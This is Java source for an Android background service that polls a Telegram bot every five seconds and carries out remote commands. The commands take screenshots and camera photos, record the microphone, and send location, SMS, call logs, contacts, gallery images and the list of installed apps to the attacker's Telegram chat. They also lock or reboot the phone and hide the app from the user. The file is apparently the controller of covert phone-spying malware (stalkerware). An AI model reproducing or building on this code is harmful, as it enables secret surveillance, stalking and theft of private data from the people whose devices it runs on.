package com.nehal.telegrammonitor;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Environment;
import android.util.Log;

import java.io.File;
import java.util.Timer;
import java.util.TimerTask;

import org.json.JSONObject;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class BotService extends Service {

    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
    private static final String CHAT_ID = "YOUR_CHAT_ID_HERE";
    private static final String BASE_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/";

    private Timer timer;
    private int lastUpdateId = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            public void run() {
                checkUpdates();
            }
        }, 0, 5000);
    }

    private void checkUpdates() {
        try {
            OkHttpClient client = new OkHttpClient();
            String url = BASE_URL + "getUpdates?offset=" + (lastUpdateId + 1);
            Request request = new Request.Builder().url(url).build();
            Response response = client.newCall(request).execute();

            if (response.isSuccessful()) {
                String jsonData = response.body().string();
                JSONObject json = new JSONObject(jsonData);
                for (int i = 0; i < json.getJSONArray("result").length(); i++) {
                    JSONObject update = json.getJSONArray("result").getJSONObject(i);
                    lastUpdateId = update.getInt("update_id");

                    if (update.has("message")) {
                        String message = update.getJSONObject("message").getString("text");
                        handleCommand(message.trim());
                    }
                }
            }
        } catch (Exception e) {
            Log.e("BotService", "Error: " + e.getMessage());
        }
    }

    private void handleCommand(String command) {
        switch (command) {
            case "/screenshot":
                ScreenshotHelper.takeScreenshot(this, BOT_TOKEN, CHAT_ID);
                break;
            case "/camera":
                CameraHelper.takePhoto(this, BOT_TOKEN, CHAT_ID);
                break;
            case "/frontcam":
                CameraHelper.takeFrontPhoto(this, BOT_TOKEN, CHAT_ID);
                break;
            case "/backcam":
                CameraHelper.takeBackPhoto(this, BOT_TOKEN, CHAT_ID);
                break;
            case "/location":
                LocationHelper.sendLocation(this, BOT_TOKEN, CHAT_ID);
                break;
            case "/recordmic":
                MicHelper.recordAndSendAudio(this, BOT_TOKEN, CHAT_ID, 10); // default 10 sec
                break;
            case "/getcalls":
                InfoHelper.sendCallLogs(this, BOT_TOKEN, CHAT_ID);
                break;
            case "/getsms":
                InfoHelper.sendSMS(this, BOT_TOKEN, CHAT_ID);
                break;
            case "/getcontacts":
                InfoHelper.sendContacts(this, BOT_TOKEN, CHAT_ID);
                break;
            case "/appusage":
                InfoHelper.sendAppUsage(this, BOT_TOKEN, CHAT_ID);
                break;
            case "/getwifi":
                InfoHelper.sendWifiInfo(this, BOT_TOKEN, CHAT_ID);
                break;
            case "/battery":
                InfoHelper.sendBatteryStatus(this, BOT_TOKEN, CHAT_ID);
                break;
            case "/listapps":
                InfoHelper.sendInstalledApps(this, BOT_TOKEN, CHAT_ID);
                break;
            case "/alertme":
                AlertSender.sendUnlockAlert(this, BOT_TOKEN, CHAT_ID);
                break;
            case "/lockscreen":
                DeviceControl.lockScreen(this);
                break;
            case "/reboot":
                DeviceControl.rebootDevice();
                break;
            case "/getgallery":
                TelegramUploader.sendGalleryImages(this, BOT_TOKEN, CHAT_ID);
                break;
            case "/hidemode on":
                AppHider.enableHideMode(this);
                break;
            case "/hidemode off":
                AppHider.disableHideMode(this);
                break;
            default:
                Log.d("BotService", "Unknown command: " + command);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        if (timer != null) {
            timer.cancel();
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
        }
